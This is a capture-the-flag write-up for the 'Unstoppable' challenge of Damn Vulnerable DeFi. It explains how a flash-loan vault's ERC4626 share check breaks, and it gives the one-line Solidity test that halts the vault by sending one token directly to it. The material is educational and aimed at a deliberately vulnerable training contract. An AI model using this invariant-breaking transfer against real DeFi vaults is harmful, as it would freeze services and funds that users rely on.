# Damn Vulnerable DeFi

## Overview

Version: 4.0.1

## Unstoppable

### Prompt

There's a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.
Starting with 10 DVT tokens in balance, show that it's possible to halt the vault. It must stop offering flash loans.

### How does the vault work?

- This vault inherited ERC4626. In ERC4626, the `deposit` function will call the `convertToShares` function to calculate the shares based on the assets deposited. At first, there are 0 tokens, the vault will create the amount of shares equal to the first deposit. So after the first deposit, the vault will maintain a 1:1 shares to assets ratio.

```solidity
function convertToShares(uint256 assets) public view virtual returns (uint256) {
    uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.

    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
}
```

- In the `flashLoan` function, the developer enforces the following condition

```solidity
if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

- I think the intention of the developer of this vault is to enforce the 1:1 ratio of shares to assets. This will work perfectly if every change to the vault assets is made through the `deposit` function. By sending assets directly to the vault, the vault will not mint any new shares to compensate for that, result in a mismatch of shares to assets ratio. This will make the vault become broken.

### Attack

- Send one token directly to the vault

```solidity
function test_unstoppable() public checkSolvedByPlayer {
    // Transfer into Vault
    require(token.transfer(address(vault), 1e18));  
}
```

- Challenge solved

![alt text](images/note/image.png)

